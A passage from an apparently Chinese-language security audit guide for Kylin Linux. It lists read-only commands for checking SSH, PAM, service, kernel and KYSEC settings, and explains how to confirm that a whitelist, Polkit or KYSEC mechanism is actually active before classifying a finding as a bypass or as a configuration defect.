grep "^PasswordAuthentication\|^PermitRootLogin\|^PermitEmptyPasswords" /etc/ssh/sshd_config
cat /etc/pam.d/system-auth

# --- 服务管理 ---
systemctl status <service>
systemctl is-active <service>

# --- 内核参数 ---
sysctl <parameter>
cat /proc/cmdline

# --- 麒麟特有 ---
kysec_get_status 2>/dev/null
cat /proc/kysec/status 2>/dev/null
ls -la /etc/app-whitelist/ 2>/dev/null
```

---

## 安全机制生效性核验（判"绕过"之前必做）

判定"白名单 / 调用者校验 / Polkit / KYSEC 被绕过"**之前**，必须先证明该机制**已加载生效**；否则"看似未拦截"可能只是"机制根本没加载"，根因与修法截然不同：

| 机制 | 生效性证据 |
|------|-----------|
| D-Bus 调用者白名单（`.limit`）| journal 中 limitCtl 的 `Insert new file … successful` / `verify check successful`（反之 `corrupted, whitelist invalid` = 未加载） |
| Polkit | `pkaction --action-id <id> --verbose` 输出 implicit 值；进程是否实际调用 `CheckAuthorization`（无该调用 = 未集成） |
| KYSEC/ksaf | `cat /sys/kernel/security/ksaf/status`（强制模式位） |

- 机制**未加载** → 配置缺陷（修：修配置 / 重新签名 / 开启强制），**不是**"绕过"。
- 机制**已加载但仍可越权** → 才是绕过漏洞。
